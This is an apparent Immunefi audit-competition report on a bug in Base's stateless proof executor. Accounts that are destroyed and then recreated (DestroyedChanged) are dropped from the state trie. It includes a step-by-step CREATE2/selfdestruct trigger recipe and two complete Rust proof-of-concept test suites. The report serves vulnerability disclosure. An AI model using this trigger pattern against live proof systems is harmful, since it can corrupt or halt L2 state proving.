# 75950 bc medium destroyedchanged accounts make proof execution diverge from canonical l2 state or halt

**Submitted on May 1st 2026 at 21:14:39 UTC by @adeolu for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75950
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * A bug in the respective layer 0/1/2 network code that results in unintended smart contract behavior with no concrete funds at direct risk

## Description

## Summary

A valid canonical Base block can contain an account that is destroyed and then recreated, but the proof executor writes back the post-block state incorrectly.

The stateless proof executor applies `revm::BundleState` updates to a Merkle Patricia Trie in `TrieDB::update_accounts`. It currently uses:

```rust
if bundle_account.was_destroyed() {
    self.root_node.delete(&account_path, &self.fetcher)?;
    self.storage_roots.remove(address);
    continue;
}
```

This treats every account that was destroyed at any point during the block as absent at the end of the block.

That is not what `revm`'s `DestroyedChanged` status means. `DestroyedChanged` means the account was destroyed and then modified or recreated. Canonical state application must wipe old storage, but if final account info exists, it must still write the final recreated account back into the state trie.

Concretely:

1. Canonical execution says the account is alive at the end of the block.
2. `revm` marks it as `DestroyedChanged`.
3. `TrieDB::update_accounts` treats it as final deletion.
4. The proof executor either deletes the account and computes the wrong state root if the account existed in parent state, or errors with `KeyNotFound` if the account did not exist in parent state.

The clean impact is:

```
The stateless proof executor is not equivalent to canonical L2 execution for a valid, user-triggerable EVM state transition.
```

That means the proof path can derive a proof-world state where a live recreated contract/account is missing. The block is valid on Base, but the proof executor cannot faithfully recompute its state/output root.

The PoC demonstrates two variants:

```
Variant A: prefunded target account
delete() succeeds, proof execution computes a noncanonical state root that drops the recreated account

Variant B: no parent target account
delete() hits KeyNotFound, proof state-root computation halts
```

## Vulnerability Detail

{% stepper %}
{% step %}

## `DestroyedChanged` is a final-present state, not a final deletion

`revm` uses `DestroyedChanged` for an account that was destroyed and then modified or recreated. `was_destroyed()` returns true for `Destroyed`, `DestroyedAgain`, and `DestroyedChanged` because old storage must be treated as wiped.

That predicate is correct for deciding whether to wipe storage. It is not sufficient for deciding whether the account is absent at the end of the block.
{% endstep %}

{% step %}

## The proof DB treats `was_destroyed()` as final deletion

Source: [`db/mod.rs:179-184`](https://github.com/base/base/blob/v0.8.0-rc.24/crates/proof/executor/src/db/mod.rs#L179-L184)

```rust
// If the account was destroyed, delete it from the trie.
if bundle_account.was_destroyed() {
    self.root_node.delete(&account_path, &self.fetcher)?;
    self.storage_roots.remove(address);
    continue;
}
```

The `continue` is the bug. For `DestroyedChanged`, it skips:

```rust
let account_info =
    bundle_account.account_info().ok_or(TrieDBError::MissingAccountInfo)?;
```

and also skips rebuilding the storage root and reinserting the account into the state trie.
{% endstep %}

{% step %}

## The bad state root is used to seal the proof-executed block

Source: [`builder/assemble.rs:41-43`](https://github.com/base/base/blob/v0.8.0-rc.24/crates/proof/executor/src/builder/assemble.rs#L41-L43)

```rust
// Compute the roots for the block header.
let state_root = self.trie_db.state_root(&bundle)?;
let transactions_root = ordered_trie_with_encoder(
```

So a wrong writeback in `TrieDB::state_root` becomes the block header `state_root`.
{% endstep %}

{% step %}

## The accepted TEE path still reaches this code

The accepted Nitro path constructs the proof pipeline with `BaseEvmFactory`, not the unused FPVM precompile factory, but the state writeback still goes through `StatelessL2Builder` and `TrieDB`.

Source: [`tee/nitro-enclave/src/server.rs:154`](https://github.com/base/base/blob/v0.8.0-rc.24/crates/proof/tee/nitro-enclave/src/server.rs#L154)

```rust
let prologue = Prologue::new(oracle.clone(), oracle, BaseEvmFactory::default());
```

Source: [`proof/src/executor.rs:78-84`](https://github.com/base/base/blob/v0.8.0-rc.24/crates/proof/proof/src/executor.rs#L78-L84)

```rust
self.inner = Some(StatelessL2Builder::new(
    self.rollup_config,
    self.evm_factory.clone(),
    self.trie_provider.clone(),
    self.trie_hinter.clone(),
    header,
));
```

{% endstep %}
{% endstepper %}

## Variant A: Prefunded Address Produces a Noncanonical Root

The strongest path is to make the target account exist in the parent trie before the destroy/recreate block. A dust balance is enough: `CREATE2` collision checks fail on nonzero nonce or nonempty code, not on a positive balance.

Attack outline:

1. Attacker deploys a `CREATE2` factory and computes future child address `X`.
2. In block `N-1`, attacker sends dust ETH to `X`.
3. In block `N`, factory deploys child `X` with `CREATE2`, then calls `X.kill()`.
4. Because `X` was created in the same transaction, EIP-6780 still allows `SELFDESTRUCT` to delete it.
5. Later in the same L2 block, the factory redeploys the same child at `X` with the same salt and initcode.
6. Canonical Base execution ends block `N` with `X` alive.
7. The merged `revm` bundle marks `X` as `DestroyedChanged`.
8. The proof DB deletes the parent-trie account and skips reinsertion.
9. The proof-computed state root omits `X`.
10. The canonical state root includes `X`.

The PoC reproduces the state-root side of this attack with the real `TrieNode` and `TrieDB::state_root` path. It creates a parent trie where `X` exists, builds a `DestroyedChanged` bundle with final account info, then compares the buggy proof root against a canonical delete-then-reinsert root.

PoC:

```rust
#[test]
fn prefunded_destroyed_changed_account_is_dropped_from_proof_state_root() {
    let (parent_header, provider, parent_root_node) = parent_with_prefunded_target();
    let final_info = final_account_info();
    let bundle = destroyed_changed_bundle(Some(prefunded_account_info()), Some(final_info.clone()));

    let mut proof_db = TrieDB::new(parent_header, provider, NoopTrieHinter);
    let proof_root = proof_db
        .state_root(&bundle)
        .expect("prefunded target exists in the parent trie, so the buggy delete succeeds");

    let expected_root = canonical_destroy_then_recreate_root(parent_root_node, final_info);

    assert_eq!(
        proof_root, EMPTY_ROOT_HASH,
        "buggy proof writeback deletes the recreated account and leaves the mini trie empty"
    );
    assert_ne!(
        proof_root, expected_root,
        "canonical execution ends with the recreated account alive, so the roots diverge"
    );
}
```

## Variant B: No Parent Account Halts Proof Execution

The same bug also has a liveness variant. If the account is newly created, destroyed, and recreated without being present in the parent trie, the proof DB still enters the `was_destroyed()` branch. It tries to delete a missing account from the state trie.

On an empty parent root, `TrieNode::delete` returns `KeyNotFound`. The state-root computation fails before block sealing.

Attack outline:

1. Attacker deploys a `CREATE2` factory and computes future child address `X`.
2. `X` is not present in the parent state trie.
3. In one L2 block, attacker creates `X`, selfdestructs it in the same transaction, then recreates it later in the same block.
4. Canonical execution ends with `X` alive.
5. The proof DB sees `DestroyedChanged`.
6. It attempts to delete `X` from the parent trie.
7. Because `X` did not exist in the parent trie, delete returns `KeyNotFound`.
8. Proof state-root computation halts.

PoC:

```rust
#[test]
fn non_prefunded_destroyed_changed_account_halts_with_key_not_found() {
    let mut parent = Header::default();
    parent.state_root = EMPTY_ROOT_HASH;
    let bundle = destroyed_changed_bundle(None, Some(final_account_info()));
    let provider = MemoryTrieProvider::default();
    let mut proof_db = TrieDB::new(parent.seal_slow(), provider, NoopTrieHinter);

    let error = proof_db
        .state_root(&bundle)
        .expect_err("buggy writeback tries to delete an account missing from the parent trie");

    assert!(
        matches!(error, TrieDBError::TrieNode(base_proof_mpt::TrieNodeError::KeyNotFound)),
        "expected missing parent account to halt proof state-root computation, got {error:?}"
    );
}
```

## Impact

The PoC proves four concrete effects:

* A valid L2 transaction pattern can trigger the bug.
* Canonical node state and proof executor state diverge.
* The proof executor can fail to prove a valid block.
* The derived output root can differ from the canonical output root.

The key impact is:

```
The stateless proof executor is not equivalent to canonical L2 execution for a valid, user-triggerable EVM state transition.
```

Canonical execution ends the block with the recreated account alive. The proof executor can instead derive a proof-world state where that live account is missing, or fail before it can compute the state root. The block is valid on Base, but the proof executor cannot faithfully recompute its state/output root.

The unintended smart contract behavior is not that the live Base chain executes the contract incorrectly. It is that proof-side state represents the final smart contract/account state incorrectly. Canonical Base says contract/account `X` exists at the end of the block with the nonce, code, and balance of the recreated account. The proof executor can instead derive that `X` does not exist at the end of the block.

That affects proof-side logic that depends on the post-block state root or account existence. For example, the proof world says `EXTCODESIZE(X) == 0`, `EXTCODEHASH(X)` is empty, or the account proof for `X` is absent, while canonical Base says `X` has code and exists. The Medium impact is therefore L2 network/proof code deriving unintended smart contract state with no concrete funds directly at risk.

The bug can make the stateless proof executor derive an L2 post-state/output root that does not match canonical Base. Any smart contract logic that accepts that derived proof state would reason over incorrect account existence, code, or storage.

The wrong-root variant is the more severe one. It allows proof execution to continue with a state root that does not match canonical Base execution.

The no-parent-account variant is a proof liveness failure. It can make otherwise valid block ranges unprovable by the affected stateless proof executor until the bug is patched or the range is bypassed by another proof system.

## Proof of Concept

Two PoC layers were added. The first proves that the destroy/recreate pattern is valid canonical Base node behavior with real signed transactions. The second proves that the proof executor's `TrieDB::state_root` writeback is not equivalent to that canonical behavior.

These snippets include every import, helper, integration-test registration, and command needed to run the PoC.

### PoC 1: canonical node accepts destroy/recreate and leaves the child live

This node e2e PoC drives a real `BaseNode` with real signed transactions and proves both variants are valid canonical EVM behavior. It deploys a fixed `CREATE2` factory, sends two same-block user transactions, and verifies that the canonical node includes both transactions and leaves the recreated child account alive. The first test prefunds the future child address in the parent state. The second leaves the child absent from the parent state.

No `Cargo.toml` change is required.

File:

```
crates/execution/node/tests/it/destroyed_changed_proof_executor.rs
```

Full contents:

```rust
//! Node e2e PoCs for destroyed-and-recreated proof state-root handling.

use std::{sync::Arc, time::Duration};

use alloy_consensus::{Header, TxEnvelope};
use alloy_eips::eip2718::{Encodable2718, WithEncoded};
use alloy_genesis::{ChainConfig, Genesis, GenesisAccount};
use alloy_primitives::{Address, B64, B256, Bytes, TxKind, U256, address, b256, keccak256};
use alloy_rpc_types_engine::PayloadAttributes;
use alloy_rpc_types_eth::{TransactionInput, TransactionRequest};
use base_common_consensus::{BaseTransactionSigned, BaseTxEnvelope, HoloceneExtraData, Predeploys};
use base_consensus_genesis::{HardForkConfig, RollupConfig, SystemConfig};
use base_execution_chainspec::{BASE_MAINNET, BASE_ZERONET, BaseChainSpecBuilder};
use base_execution_payload_builder::OpPayloadBuilderAttributes;
use base_node_core::BaseNode;
use base_protocol::L1BlockInfoTx;
use reth_chainspec::{BaseFeeParams, EthChainSpec};
use reth_db::test_utils::create_test_rw_db_with_path;
use reth_e2e_test_utils::{
    node::NodeTestContext, transaction::TransactionTestContext, wallet::Wallet,
};
use reth_ethereum_forks::{EthereumHardfork, ForkCondition};
use reth_node_api::PayloadBuilderAttributes;
use reth_node_builder::{EngineNodeLauncher, Node, NodeBuilder, NodeConfig};
use reth_node_core::args::DatadirArgs;
use reth_payload_builder::EthPayloadBuilderAttributes;
use reth_provider::{AccountReader, providers::BlockchainProvider};
use reth_tasks::Runtime;
use reth_transaction_pool::TransactionPool;

const FIRST_PAYLOAD_TIMESTAMP: u64 = 1_710_338_136;
const PAYLOAD_GAS_LIMIT: u64 = 30_000_000;
const CREATE_DESTROY_GAS_LIMIT: u64 = 500_000;
const MAX_FEE_PER_GAS: u128 = 1_000_000_000;
const PRIORITY_FEE_PER_GAS: u128 = 1_000_000;
const GENESIS_ACCOUNT_BALANCE: u128 = 10_000_000_000_000_000_000;
const PREFUND_BALANCE: u64 = 1;
const FACTORY: Address = address!("00000000000000000000000000000000fac7a000");
const CREATE2_SALT: B256 =
    b256!("0000000000000000000000000000000000000000000000000000000000000001");

macro_rules! build_payload_including_txs {
    ($node:expr, [$($tx_hash:expr),+], $description:expr) => {{
        let attrs = $node.payload.new_payload().await.expect("failed to start payload");
        $node.payload.expect_attr_event(attrs.clone()).await.expect("missing attributes event");
        let payload_id = attrs.payload_id();
        let expected_hashes = [$($tx_hash),+];
        let payload = tokio::time::timeout(Duration::from_secs(30), async {
            loop {
                match $node.inner.payload_builder_handle.best_payload(payload_id).await {
                    Some(Ok(payload))
                        if expected_hashes.iter().all(|hash| {
                            payload
                                .block()
                                .body()
                                .transactions
                                .iter()
                                .any(|tx| tx.tx_hash() == *hash)
                        }) =>
                    {
                        break payload;
                    }
                    Some(Ok(_)) | None => tokio::time::sleep(Duration::from_millis(20)).await,
                    Some(Err(error)) => panic!("{} build failed: {:?}", $description, error),
                }
            }
        })
        .await
        .unwrap_or_else(|_| panic!("timed out building {}", $description));

        let block_hash = payload.block().hash();
        $node.submit_payload(payload.clone()).await.expect("failed to submit payload");
        $node.update_forkchoice(block_hash, block_hash).await.expect("failed to update forkchoice");

        payload
    }};
}

#[tokio::test]
async fn prefunded_node_e2e_destroyed_changed_pattern_leaves_child_live() {
    run_destroyed_changed_node_scenario(true).await;
}

#[tokio::test]
async fn non_prefunded_node_e2e_destroyed_changed_pattern_leaves_child_live() {
    run_destroyed_changed_node_scenario(false).await;
}

async fn run_destroyed_changed_node_scenario(prefund_child: bool) {
    let chain_id: u64 = BASE_MAINNET.chain.into();
    let sender = Wallet::default().with_chain_id(chain_id);
    let sender_address = sender.inner.address();
    let child = create2_child_address();

    let create_destroy_tx = signed_tx(
        TransactionTestContext::sign_tx(sender.inner.clone(), factory_call(chain_id, 0, 1)).await,
    );
    let recreate_tx = signed_tx(
        TransactionTestContext::sign_tx(sender.inner.clone(), factory_call(chain_id, 1, 2)).await,
    );

    let mut genesis = test_genesis();
    genesis.alloc.insert(
        sender_address,
        GenesisAccount { balance: U256::from(GENESIS_ACCOUNT_BALANCE), ..Default::default() },
    );
    genesis.alloc.insert(
        FACTORY,
        GenesisAccount { nonce: Some(1), code: Some(factory_runtime()), ..Default::default() },
    );
    if prefund_child {
        genesis.alloc.insert(
            child,
            GenesisAccount { balance: U256::from(PREFUND_BALANCE), ..Default::default() },
        );
    }

    let chain_spec = Arc::new(
        BaseChainSpecBuilder::base_mainnet()
            .genesis(genesis)
            .isthmus_activated()
            .with_fork(EthereumHardfork::Prague, ForkCondition::Timestamp(0))
            .build(),
    );
    let mut config =
        NodeConfig::new(chain_spec).with_unused_ports().with_datadir_args(DatadirArgs {
            datadir: reth_db::test_utils::tempdir_path().into(),
            ..Default::default()
        });
    config.txpool.minimal_protocol_basefee = 0;
    config.txpool.max_tx_gas_limit = Some(PAYLOAD_GAS_LIMIT);
    config.network.discovery.discv5_port = 0;
    config.network.discovery.discv5_port_ipv6 = 0;

    let db = create_test_rw_db_with_path(
        config
            .datadir
            .datadir
            .unwrap_or_chain_default(config.chain.chain(), config.datadir.clone())
            .db(),
    );
    let runtime = Runtime::test();
    let node_handle = NodeBuilder::new(config)
        .with_database(db)
        .with_types_and_provider::<BaseNode, BlockchainProvider<_>>()
        .with_components(BaseNode::default().components())
        .with_add_ons(BaseNode::new(Default::default()).add_ons())
        .launch_with_fn(|builder| {
            let launcher = EngineNodeLauncher::new(
                runtime.clone(),
                builder.config.datadir(),
                Default::default(),
            );
            builder.launch_with(launcher)
        })
        .await
        .expect("failed to launch node");

    let mut node = NodeTestContext::new(node_handle.node, payload_attributes_with_l1_info)
        .await
        .expect("failed to create node test context");

    let create_destroy_hash = node
        .rpc
        .inject_tx(create_destroy_tx.raw_tx.clone())
        .await
        .expect("txpool accepted create/destroy tx");
    assert_eq!(create_destroy_hash, create_destroy_tx.hash);
    let recreate_hash =
        node.rpc.inject_tx(recreate_tx.raw_tx.clone()).await.expect("txpool accepted recreate tx");
    assert_eq!(recreate_hash, recreate_tx.hash);
    assert!(node.inner.pool.get(&create_destroy_tx.hash).is_some());
    assert!(node.inner.pool.get(&recreate_tx.hash).is_some());

    let payload = build_payload_including_txs!(
        node,
        [create_destroy_tx.hash, recreate_tx.hash],
        "destroy/recreate block"
    );
    let block = payload.block();
    assert!(
        block.body().transactions.iter().any(|tx| tx.tx_hash() == create_destroy_tx.hash),
        "canonical node includes the create-and-selfdestruct transaction"
    );
    assert!(
        block.body().transactions.iter().any(|tx| tx.tx_hash() == recreate_tx.hash),
        "canonical node includes the recreate transaction"
    );

    let child_account = node
        .inner
        .provider
        .basic_account(&child)
        .expect("child account lookup succeeds")
        .expect("canonical node leaves recreated child account alive");
    assert_eq!(child_account.nonce, 1);
    assert_eq!(child_account.balance, U256::ZERO);
    assert_eq!(child_account.bytecode_hash, Some(keccak256(child_runtime())));
}

fn signed_tx(signed: TxEnvelope) -> SignedTx {
    let raw_tx = signed.encoded_2718().into();
    let tx = BaseTxEnvelope::try_from(signed).expect("Ethereum EIP-1559 tx converts to Base tx");
    let hash = tx.tx_hash();

    SignedTx { raw_tx, hash }
}

fn factory_call(chain_id: u64, nonce: u64, mode: u8) -> TransactionRequest {
    TransactionRequest {
        nonce: Some(nonce),
        to: Some(TxKind::Call(FACTORY)),
        gas: Some(CREATE_DESTROY_GAS_LIMIT),
        max_fee_per_gas: Some(MAX_FEE_PER_GAS),
        max_priority_fee_per_gas: Some(PRIORITY_FEE_PER_GAS),
        chain_id: Some(chain_id),
        input: TransactionInput::new(Bytes::from(vec![mode])),
        ..Default::default()
    }
}

fn create2_child_address() -> Address {
    let init_hash = keccak256(child_initcode());
    let mut preimage = Vec::with_capacity(85);
    preimage.push(0xff);
    preimage.extend_from_slice(FACTORY.as_slice());
    preimage.extend_from_slice(CREATE2_SALT.as_slice());
    preimage.extend_from_slice(init_hash.as_slice());

    let hash = keccak256(preimage);
    Address::from_slice(&hash.as_slice()[12..])
}

fn factory_runtime() -> Bytes {
    let initcode = child_initcode();
    let init_len = initcode.len();
    assert!(u8::try_from(init_len).is_ok());

    let mut code = vec![
        0x60, 0x00, // PUSH1 0
        0x35, // CALLDATALOAD
        0x60, 0xf8, // PUSH1 248
        0x1c, // SHR
        0x80, // DUP1
        0x60, 0x01, // PUSH1 1
        0x14, // EQ
        0x60, 0x00, // PUSH1 destroy_label
        0x57, // JUMPI
        0x60, 0x02, // PUSH1 create_label
        0x14, // EQ
        0x60, 0x00, // PUSH1 create_label
        0x57, // JUMPI
        0x00, // STOP
    ];
    let mut init_offset_placeholders = Vec::new();

    let destroy_label = code.len();
    code[11] = destroy_label as u8;
    code.push(0x5b); // JUMPDEST
    code.push(0x50); // POP selector left by DUP1
    append_create2(&mut code, init_len, &mut init_offset_placeholders);
    append_call_child(&mut code);

    let create_label = code.len();
    code[17] = create_label as u8;
    code.push(0x5b); // JUMPDEST
    append_create2(&mut code, init_len, &mut init_offset_placeholders);
    code.push(0x50); // POP child address
    code.push(0x00); // STOP

    let init_offset = code.len();
    assert!(u8::try_from(init_offset).is_ok());
    for placeholder in init_offset_placeholders {
        code[placeholder] = init_offset as u8;
    }
    code.extend_from_slice(&initcode);

    code.into()
}

fn append_create2(code: &mut Vec<u8>, init_len: usize, init_offset_placeholders: &mut Vec<usize>) {
    code.push(0x60); // PUSH1 init_len
    code.push(init_len as u8);
    code.push(0x60); // PUSH1 init_offset
    init_offset_placeholders.push(code.len());
    code.push(0x00);
    code.push(0x60); // PUSH1 memory_offset
    code.push(0x00);
    code.push(0x39); // CODECOPY
    code.push(0x7f); // PUSH32 salt
    code.extend_from_slice(CREATE2_SALT.as_slice());
    code.push(0x60); // PUSH1 init_len
    code.push(init_len as u8);
    code.push(0x60); // PUSH1 memory_offset
    code.push(0x00);
    code.push(0x60); // PUSH1 value
    code.push(0x00);
    code.push(0xf5); // CREATE2
}

fn append_call_child(code: &mut Vec<u8>) {
    for _ in 0..5 {
        code.push(0x60); // PUSH1 0
        code.push(0x00);
    }
    code.push(0x85); // DUP6 child address
    code.push(0x5a); // GAS
    code.push(0xf1); // CALL
    code.push(0x50); // POP call result
    code.push(0x50); // POP child address
    code.push(0x00); // STOP
}

fn child_initcode() -> Bytes {
    let runtime = child_runtime();
    let runtime_len = runtime.len();
    assert!(u8::try_from(runtime_len).is_ok());

    let mut code = vec![
        0x60,
        runtime_len as u8,
        0x60,
        0x0c,
        0x60,
        0x00,
        0x39,
        0x60,
        runtime_len as u8,
        0x60,
        0x00,
        0xf3,
    ];
    code.extend_from_slice(&runtime);
    code.into()
}

fn child_runtime() -> Bytes {
    let mut code = vec![0x73];
    code.extend_from_slice(Address::ZERO.as_slice());
    code.push(0xff);
    code.into()
}

fn test_genesis() -> Genesis {
    let mut genesis: Genesis = serde_json::from_str(include_str!("../assets/genesis.json"))
        .expect("test genesis should decode");
    genesis.base_fee_per_gas = Some(0u64.into());
    genesis.extra_data = HoloceneExtraData::encode(B64::ZERO, BaseFeeParams::optimism())
        .expect("default Holocene extra data should encode");
    genesis.blob_gas_used = Some(0);
    genesis.excess_blob_gas = Some(0);

    let proxy_account = BASE_ZERONET
        .genesis
        .alloc
        .get(&Predeploys::L1_BLOCK_INFO)
        .expect("zeronet genesis has L1 block info proxy")
        .clone();
    let implementation_address = l1_block_info_implementation(&proxy_account);
    let implementation_account = BASE_ZERONET
        .genesis
        .alloc
        .get(&implementation_address)
        .expect("zeronet genesis has L1 block info implementation")
        .clone();

    genesis.alloc.insert(Predeploys::L1_BLOCK_INFO, proxy_account);
    genesis.alloc.insert(implementation_address, implementation_account);
    genesis
}

fn l1_block_info_implementation(proxy_account: &GenesisAccount) -> Address {
    let implementation_slot =
        b256!("360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc");
    let storage = proxy_account.storage.as_ref().expect("proxy account has storage");
    let implementation =
        storage.get(&implementation_slot).expect("proxy account has EIP-1967 implementation slot");

    Address::from_slice(&implementation.as_slice()[12..])
}

fn payload_attributes_with_l1_info(
    timestamp: u64,
) -> OpPayloadBuilderAttributes<BaseTransactionSigned> {
    let attributes = PayloadAttributes {
        timestamp,
        prev_randao: B256::ZERO,
        suggested_fee_recipient: Address::ZERO,
        withdrawals: Some(vec![]),
        parent_beacon_block_root: Some(B256::ZERO),
    };

    OpPayloadBuilderAttributes {
        payload_attributes: EthPayloadBuilderAttributes::new(B256::ZERO, attributes),
        transactions: vec![l1_info_deposit(timestamp)],
        no_tx_pool: false,
        gas_limit: Some(PAYLOAD_GAS_LIMIT),
        eip_1559_params: Some(B64::ZERO),
        min_base_fee: None,
    }
}

fn l1_info_deposit(timestamp: u64) -> WithEncoded<BaseTransactionSigned> {
    let (_, deposit) = L1BlockInfoTx::try_new_with_deposit_tx(
        &rollup_config(),
        &ChainConfig::default(),
        &system_config(),
        timestamp.saturating_sub(FIRST_PAYLOAD_TIMESTAMP),
        &l1_header(timestamp),
        timestamp,
    )
    .expect("Isthmus L1 info deposit tx should be valid");
    let tx = BaseTxEnvelope::from(deposit);
    let encoded = tx.encoded_2718().into();

    WithEncoded::new(encoded, tx)
}

fn rollup_config() -> RollupConfig {
    RollupConfig {
        hardforks: HardForkConfig {
            regolith_time: Some(0),
            ecotone_time: Some(0),
            isthmus_time: Some(0),
            ..Default::default()
        },
        ..Default::default()
    }
}

fn system_config() -> SystemConfig {
    SystemConfig {
        scalar: U256::ZERO,
        operator_fee_scalar: Some(0),
        operator_fee_constant: Some(0),
        ..Default::default()
    }
}

fn l1_header(timestamp: u64) -> Header {
    Header {
        number: timestamp.saturating_sub(FIRST_PAYLOAD_TIMESTAMP),
        timestamp,
        base_fee_per_gas: Some(1),
        excess_blob_gas: Some(0),
        blob_gas_used: Some(0),
        ..Default::default()
    }
}

struct SignedTx {
    raw_tx: Bytes,
    hash: B256,
}
```

### Related integration-test registration

Path:

```
crates/execution/node/tests/it/main.rs
```

The integration test target must import the new test module:

```rust
//! Integration tests for the execution node.

mod priority;

mod rpc;

mod custom_genesis;

mod operator_fee_txpool;

mod blobbasefee_proof_executor;

mod destroyed_changed_proof_executor;

const fn main() {}
```

From the repository root, run:

```bash
cargo test -p base-node-core --test it destroyed_changed_proof_executor -- --nocapture
```

Observed result:

```
running 2 tests
test destroyed_changed_proof_executor::prefunded_node_e2e_destroyed_changed_pattern_leaves_child_live ... ok
test destroyed_changed_proof_executor::non_prefunded_node_e2e_destroyed_changed_pattern_leaves_child_live ... ok

test result: ok. 2 passed; 0 failed
```

### PoC 2: proof executor drops or halts on `DestroyedChanged`

This proof-executor PoC drives the vulnerable state-root writeback directly. It does not mock the vulnerable function. It uses:

```
revm::BundleState
base_proof_mpt::TrieNode
base_proof_executor::TrieDB::state_root
```

No `Cargo.toml` change is required.

File:

```
crates/proof/executor/tests/destroyed_changed_poc.rs
```

Full contents:

```rust
//! End-to-end PoCs for `DestroyedChanged` proof state-root handling.

use alloy_consensus::Header;
use alloy_primitives::{Address, B256, Bytes, Sealable, U256, address, b256, keccak256};
use alloy_rlp::Encodable;
use alloy_trie::{EMPTY_ROOT_HASH, Nibbles, TrieAccount};
use base_proof_executor::{TrieDB, TrieDBError, TrieDBProvider};
use base_proof_mpt::{NoopTrieHinter, TrieNode, TrieProvider};
use revm::{
    database::{AccountStatus, BundleAccount, BundleState},
    primitives::HashMap,
    state::AccountInfo,
};

const TARGET: Address = address!("1111111111111111111111111111111111111111");
const PARENT_BALANCE: u64 = 1;
const FINAL_NONCE: u64 = 1;
const FINAL_BALANCE: u64 = 7;
const FINAL_CODE_HASH: B256 =
    b256!("1111111111111111111111111111111111111111111111111111111111111111");

#[test]
fn prefunded_destroyed_changed_account_is_dropped_from_proof_state_root() {
    let (parent_header, provider, parent_root_node) = parent_with_prefunded_target();
    let final_info = final_account_info();
    let bundle = destroyed_changed_bundle(Some(prefunded_account_info()), Some(final_info.clone()));

    let mut proof_db = TrieDB::new(parent_header, provider, NoopTrieHinter);
    let proof_root = proof_db
        .state_root(&bundle)
        .expect("prefunded target exists in the parent trie, so the buggy delete succeeds");

    let expected_root = canonical_destroy_then_recreate_root(parent_root_node, final_info);

    assert_eq!(
        proof_root, EMPTY_ROOT_HASH,
        "buggy proof writeback deletes the recreated account and leaves the mini trie empty"
    );
    assert_ne!(
        proof_root, expected_root,
        "canonical execution ends with the recreated account alive, so the roots diverge"
    );
}

#[test]
fn non_prefunded_destroyed_changed_account_halts_with_key_not_found() {
    let mut parent = Header::default();
    parent.state_root = EMPTY_ROOT_HASH;
    let bundle = destroyed_changed_bundle(None, Some(final_account_info()));
    let provider = MemoryTrieProvider::default();
    let mut proof_db = TrieDB::new(parent.seal_slow(), provider, NoopTrieHinter);

    let error = proof_db
        .state_root(&bundle)
        .expect_err("buggy writeback tries to delete an account missing from the parent trie");

    assert!(
        matches!(error, TrieDBError::TrieNode(base_proof_mpt::TrieNodeError::KeyNotFound)),
        "expected missing parent account to halt proof state-root computation, got {error:?}"
    );
}

fn parent_with_prefunded_target() -> (alloy_consensus::Sealed<Header>, MemoryTrieProvider, TrieNode)
{
    let mut root = TrieNode::Empty;
    root.insert(
        &account_path(TARGET),
        trie_account_rlp(&TrieAccount {
            balance: U256::from(PARENT_BALANCE),
            nonce: 0,
            code_hash: keccak256([]),
            storage_root: EMPTY_ROOT_HASH,
        }),
        &MemoryTrieProvider::default(),
    )
    .expect("parent target account inserts into trie");

    let root_hash = root.blind();
    let mut provider = MemoryTrieProvider::default();
    provider.nodes.insert(root_hash, root.clone());

    let mut parent = Header::default();
    parent.state_root = root_hash;
    (parent.seal_slow(), provider, root)
}

fn canonical_destroy_then_recreate_root(mut root: TrieNode, final_info: AccountInfo) -> B256 {
    let path = account_path(TARGET);
    root.delete(&path, &MemoryTrieProvider::default())
        .expect("prefunded target account can be removed before reinsertion");
    root.insert(
        &path,
        trie_account_rlp(&TrieAccount {
            balance: final_info.balance,
            nonce: final_info.nonce,
            code_hash: final_info.code_hash,
            storage_root: EMPTY_ROOT_HASH,
        }),
        &MemoryTrieProvider::default(),
    )
    .expect("final recreated account inserts into trie");
    root.blind()
}

fn destroyed_changed_bundle(
    original: Option<AccountInfo>,
    present: Option<AccountInfo>,
) -> BundleState {
    let mut state = HashMap::default();
    state.insert(
        TARGET,
        BundleAccount::new(original, present, Default::default(), AccountStatus::DestroyedChanged),
    );

    BundleState {
        state,
        contracts: Default::default(),
        reverts: Default::default(),
        state_size: 1,
        reverts_size: 0,
    }
}

fn prefunded_account_info() -> AccountInfo {
    AccountInfo {
        balance: U256::from(PARENT_BALANCE),
        nonce: 0,
        code_hash: keccak256([]),
        account_id: None,
        code: None,
    }
}

fn final_account_info() -> AccountInfo {
    AccountInfo {
        balance: U256::from(FINAL_BALANCE),
        nonce: FINAL_NONCE,
        code_hash: FINAL_CODE_HASH,
        account_id: None,
        code: None,
    }
}

fn account_path(address: Address) -> Nibbles {
    Nibbles::unpack(keccak256(address.as_slice()))
}

fn trie_account_rlp(account: &TrieAccount) -> Bytes {
    let mut buf = Vec::with_capacity(account.length());
    account.encode(&mut buf);
    buf.into()
}

#[derive(Clone, Debug, Default)]
struct MemoryTrieProvider {
    nodes: HashMap<B256, TrieNode>,
}

impl TrieProvider for MemoryTrieProvider {
    type Error = &'static str;

    fn trie_node_by_hash(&self, key: B256) -> Result<TrieNode, Self::Error> {
        self.nodes.get(&key).cloned().ok_or("missing trie node")
    }
}

impl TrieDBProvider for MemoryTrieProvider {
    fn bytecode_by_hash(&self, _code_hash: B256) -> Result<Bytes, Self::Error> {
        Err("bytecode is not used by this PoC")
    }

    fn header_by_hash(&self, _hash: B256) -> Result<Header, Self::Error> {
        Err("headers are not used by this PoC")
    }
}
```

From the repository root, run:

```bash
cargo test -p base-proof-executor --test destroyed_changed_poc
```

Observed result:

```
running 2 tests
test non_prefunded_destroyed_changed_account_halts_with_key_not_found ... ok
test prefunded_destroyed_changed_account_is_dropped_from_proof_state_root ... ok

test result: ok. 2 passed; 0 failed
```
